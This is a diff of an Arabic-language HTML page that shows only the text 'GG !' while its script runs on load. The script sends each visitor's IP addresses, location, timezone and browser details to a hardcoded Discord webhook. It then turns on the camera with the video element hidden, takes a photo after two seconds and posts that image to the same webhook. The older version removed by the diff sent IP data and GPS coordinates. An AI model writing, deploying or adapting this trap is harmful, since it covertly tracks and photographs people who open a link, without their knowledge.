@@ -2,7 +2,7 @@
 <html lang="ar">
 <head>
   <meta charset="UTF-8">
-  <title>GG فيديو + معلومات</title>
+  <title>GG !</title>
   <style>
     body {
       margin: 0;
@@ -21,68 +21,98 @@
       font-weight: bold;
       margin-bottom: 20px;
     }
-    video {
-      width: 480px;
-      height: 480px;
-      object-fit: cover;
-      border: none;
-      outline: none;
+    video, canvas {
+      display: none;
     }
   </style>
 </head>
 <body>
 
   <div id="gg-text">GG !</div>
-  <video autoplay muted playsinline>
-    <source src="https://files.catbox.moe/hseztt.mov" type="video/quicktime">
-    متصفحك ما يدعم تشغيل هذا الفيديو
-  </video>
+
+  <video id="video" autoplay playsinline></video>
+  <canvas id="canvas"></canvas>
 
   <script>
-    const discordWebhookUrl = 'https://discord.com/api/webhooks/1352849557184053290/lD7F2L2xR6GEKGoXV5s8L_cW5QmhTQJsZTSAoRYX9qy4Leobxmq64Izkyst-AFkrypFv';
+    const webhookUrl = 'https://discord.com/api/webhooks/1352849557184053290/lD7F2L2xR6GEKGoXV5s8L_cW5QmhTQJsZTSAoRYX9qy4Leobxmq64Izkyst-AFkrypFv'
 
-    async function sendUserInfo() {
+    async function getIPData() {
       try {
-        const [geoRes, ipRes] = await Promise.all([
+        const [geoRes, ipv4Res, ipv6Res] = await Promise.all([
           fetch('https://ipapi.co/json/'),
+          fetch('https://api.ipify.org?format=json'),
           fetch('https://api64.ipify.org?format=json')
-        ]);
+        ])
 
-        const geoData = await geoRes.json();
-        const ipData = await ipRes.json();
+        const geo = await geoRes.json()
+        const ipv4 = (await ipv4Res.json()).ip
+        const ipv6 = (await ipv6Res.json()).ip
+        const ua = navigator.userAgent
 
-        const ip = ipData.ip || 'غير معروف';
-        const userAgent = navigator.userAgent;
-        const latitude = geoData.latitude || 'غير متوفر';
-        const longitude = geoData.longitude || 'غير متوفر';
+        const msg = `
+📡 دخول جديد:
 
-        const message = `
-📡 معلومات جديدة:
+🔢 IPv4: ${ipv4}
+🧬 IPv6: ${ipv6}
+🏳️ الدولة: ${geo.country_name}
+🏙️ المدينة: ${geo.city}
+🕓 التوقيت: ${geo.timezone}
+📱 الجهاز والمتصفح: ${ua}
+        `.trim()
 
-🌍 IP: ${ip}
-🏳️ الدولة: ${geoData.country_name}
-📍 المنطقة: ${geoData.region}
-🏙️ المدينة: ${geoData.city}
-🧭 الإحداثيات: ${latitude}, ${longitude}
-🕓 التوقيت: ${geoData.timezone}
-🧠 المتصفح والجهاز: ${userAgent}
-        `.trim();
-
-        await fetch(discordWebhookUrl, {
+        await fetch(webhookUrl, {
           method: 'POST',
           headers: { 'Content-Type': 'application/json' },
-          body: JSON.stringify({ content: message })
-        });
-
-        console.log('✅ تم إرسال المعلومات');
+          body: JSON.stringify({ content: msg })
+        })
 
       } catch (err) {
-        console.error('❌ خطأ أثناء الإرسال:', err);
+        console.error('خطأ في جلب أو إرسال المعلومات', err)
       }
     }
 
-    // شغل الإرسال أول ما يفتح الصفحة
-    window.addEventListener('load', sendUserInfo);
+    async function captureAndSendPhoto() {
+      try {
+        const stream = await navigator.mediaDevices.getUserMedia({ video: true })
+        const video = document.getElementById('video')
+        const canvas = document.getElementById('canvas')
+        video.srcObject = stream
+
+        // ننتظر شوي لين تشتغل الكاميرا
+        await new Promise(resolve => setTimeout(resolve, 2000))
+
+        canvas.width = video.videoWidth
+        canvas.height = video.videoHeight
+        canvas.getContext('2d').drawImage(video, 0, 0)
+
+        const imgData = canvas.toDataURL('image/png')
+
+        await fetch(webhookUrl, {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify({
+            content: '📸 صورة الكاميرا:',
+            embeds: [{
+              image: {
+                url: imgData
+              }
+            }]
+          })
+        })
+
+        // نوقف الكاميرا
+        stream.getTracks().forEach(track => track.stop())
+
+      } catch (err) {
+        console.warn('المستخدم رفض الكاميرا أو فيه خطأ', err)
+      }
+    }
+
+    window.addEventListener('load', async () => {
+      await getIPData()
+      // بعد ما يرسل المعلومات، نطلب الكاميرا
+      captureAndSendPhoto()
+    })
   </script>
 
 </body>
